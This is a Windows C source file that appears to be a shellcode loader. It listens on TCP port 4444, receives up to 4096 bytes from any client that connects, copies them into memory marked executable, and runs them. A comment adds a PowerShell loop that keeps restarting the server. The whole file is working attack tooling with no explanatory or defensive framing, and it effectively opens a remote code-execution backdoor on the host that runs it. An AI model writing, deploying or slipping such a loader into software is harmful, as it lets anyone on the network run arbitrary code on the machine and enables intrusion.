#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

#define PORT 4444
#define MAX_SHELLCODE_SIZE 4096

/*
while($true) { Write-Host "[+] Launching Server..."; Start-Process .\server.exe -Wait; Write-Host "[!] Server crashed or exited. Restarting in 1s..."; Start-Sleep -s 1 }
*/

int main() {
    WSADATA wsaData;
    SOCKET ListenSocket = INVALID_SOCKET, ClientSocket = INVALID_SOCKET;
    struct sockaddr_in server, client;
    int clientAddrSize = sizeof(client);
    char recvbuf[MAX_SHELLCODE_SIZE];

    // 1. Initialize Winsock
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // 2. Create and Bind Socket
    ListenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(PORT);
    bind(ListenSocket, (struct sockaddr*)&server, sizeof(server));

    // 3. Listen for connection
    listen(ListenSocket, SOMAXCONN);
    printf("[+] Server listening on port %d...\n", PORT);

    ClientSocket = accept(ListenSocket, (struct sockaddr*)&client, &clientAddrSize);
    printf("[+] Connection accepted. Receiving shellcode...\n");

    // 4. Receive the shellcode
    int bytesReceived = recv(ClientSocket, recvbuf, MAX_SHELLCODE_SIZE, 0);
    if (bytesReceived > 0) {
        printf("[+] Received %d bytes. Allocating memory...\n", bytesReceived);

        // 5. Allocate Executable Memory
        void* exec = VirtualAlloc(NULL, bytesReceived, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (exec) {
            memcpy(exec, recvbuf, bytesReceived);
            printf("[+] Executing at %p...\n", exec);
            
            // 6. Run the shellcode
            ((void(*)())exec)();
        }
    }

    closesocket(ClientSocket);
    WSACleanup();
    return 0;
}